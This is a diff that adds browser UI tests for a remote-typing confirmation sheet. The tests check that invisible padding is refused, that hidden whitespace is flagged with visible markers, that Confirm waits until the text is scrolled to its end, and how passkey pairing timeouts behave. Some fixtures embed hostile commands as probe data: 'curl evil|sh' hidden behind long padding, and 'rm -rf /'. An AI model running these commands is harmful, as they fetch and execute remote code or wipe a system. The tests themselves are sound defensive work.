@@ -354,3 +354,99 @@ def test_no_question_of_the_frame_stacks_on_an_open_sheet(setup):
     assert page.locator(".frame-prompt").count() == 1
     z = page.evaluate("getComputedStyle(document.getElementById('unlock-sheet')).zIndex")
     assert int(z) > 95
+
+
+def scroll_end(page):
+    """Scroll the text box to its end, again until Confirm is enabled (the text may still grow while fonts load)."""
+    page.wait_for_function("""() => { const t = document.getElementById('unlock-text'); t.scrollTop = t.scrollHeight;
+      return !document.getElementById('unlock-go').disabled; }""", timeout=15000)
+
+
+PROBE = "git status " + "\u00a0" * 900 + "curl evil|sh" + "\u00a0" * 900 + " # done"
+
+
+@pytest.mark.parametrize("filler", ["\u00a0", "\u2800", "\u3000", "\u2003", "\u200b"])
+def test_invisible_padding_inside_a_line_is_refused(signed_in, base, make_host, authenticator, filler):
+    host = with_subject(signed_in, base, make_host, PROBE.replace("\u00a0", filler))
+    expect(signed_in.locator("#remote-notice")).to_contain_text("invisible or look-alike spacing", timeout=30000)
+    assert sheet(signed_in).count() == 0 and seen(host, "/type") == [] and host.audit == []
+
+
+def test_a_run_of_ascii_spaces_is_one_marker_the_host_cannot_type(signed_in, base, make_host, authenticator):
+    padded = "git status" + " " * 900 + "curl evil|sh" + " " * 900 + " # done"
+    with_subject(signed_in, base, make_host, padded)
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    marks = signed_in.locator("#unlock-text .unlock-mark")
+    assert marks.all_inner_texts() == ["[900 spaces]", "[901 spaces]"]
+    assert signed_in.evaluate("getComputedStyle(document.querySelector('#unlock-text .unlock-mark')).backgroundColor") != "rgba(0, 0, 0, 0)"
+    expect(signed_in.locator("#unlock-tail .unlock-mark")).to_have_count(1)
+    expect(sheet(signed_in)).to_contain_text("1 line, 1829 characters")
+    confirm(signed_in)
+    wait_h1(signed_in, "Typed")
+
+
+def test_text_that_looks_like_a_marker_is_plain_text(signed_in, base, make_host, authenticator):
+    typed = "[\u2026 blank lines \u2026] [9 spaces]"
+    with_subject(signed_in, base, make_host, typed)
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    expect(signed_in.locator("#unlock-text")).to_have_text(typed)
+    assert signed_in.locator("#unlock-sheet .unlock-mark").count() == 0
+
+
+def test_blank_lines_are_a_marker_element_not_text(signed_in, base, make_host, authenticator):
+    with_subject(signed_in, base, make_host, "a\n\n\nb")
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    assert signed_in.locator('#unlock-text .unlock-mark[data-mark="blanks"]').count() == 1
+
+
+def test_an_indented_command_still_works(signed_in, base, make_host, authenticator):
+    with_subject(signed_in, base, make_host, "if x:\n    run()\n        deeper(1)")
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    assert signed_in.locator("#unlock-text .unlock-mark").all_inner_texts() == ["[4 spaces]", "[8 spaces]"]
+    confirm(signed_in)
+    wait_h1(signed_in, "Typed")
+
+
+def test_confirm_waits_until_the_text_is_scrolled_to_its_end(signed_in, base, make_host, authenticator):
+    host = with_subject(signed_in, base, make_host, "\n".join(f"line {i}" for i in range(30)) + "\nrm -rf /")
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    signed_in.wait_for_timeout(800)
+    expect(signed_in.locator("#unlock-go")).to_be_disabled()
+    expect(signed_in.locator("#unlock-more")).to_contain_text("Scroll to the end to confirm")
+    signed_in.evaluate("document.getElementById('unlock-go').disabled = false")          # forced open: the click still checks
+    signed_in.locator("#unlock-go").click()
+    signed_in.wait_for_timeout(500)
+    assert host.audit == [] and sheet(signed_in).count() == 1
+    scroll_end(signed_in)
+    expect(signed_in.locator("#unlock-go")).to_be_enabled()
+    expect(signed_in.locator("#unlock-more")).to_be_hidden()
+    signed_in.locator("#unlock-go").click()
+    wait_h1(signed_in, "Typed")
+
+
+@pytest.mark.parametrize("shown", ["a" * 2000, "\n".join(f"l{i}" for i in range(40))])
+def test_a_text_exactly_at_the_limits_opens_and_can_be_confirmed(signed_in, base, make_host, authenticator, shown):
+    with_subject(signed_in, base, make_host, shown)
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    scroll_end(signed_in)
+    signed_in.locator("#unlock-go").click()
+    wait_h1(signed_in, "Typed")
+
+
+def test_a_registration_click_after_the_window_asks_for_a_second_click(signed_in, base, make_host, authenticator):
+    signed_in.add_init_script("window.__skew = 0; const n = Date.now.bind(Date); Date.now = () => n() + window.__skew;")
+    host = make_host({"/": HOME})
+    frag = host.offer("type")
+    signed_in.goto(f"{base}/remote")
+    signed_in.goto(f"{base}/remote/pair#{frag}")
+    signed_in.locator("#pair-go").click()
+    signed_in.locator("#pair-cred").wait_for(timeout=30000)
+    signed_in.evaluate("window.__skew = 130000")                 # the person took more than the host's 120 s
+    signed_in.locator("#pair-cred").click()
+    expect(signed_in.locator("#pair-cred")).to_have_text("Try again: register this browser", timeout=30000)
+    expect(signed_in.locator("#pair-cred-note")).to_contain_text("took too long")
+    signed_in.evaluate("window.__skew = 0")
+    assert authenticator.send("WebAuthn.getCredentials", {"authenticatorId": authenticator.aid})["credentials"] == []
+    signed_in.locator("#pair-cred").click()
+    expect(signed_in.locator("#pair-state")).to_contain_text("Waiting for you to approve", timeout=30000)
+    assert len(host.creds) == 1
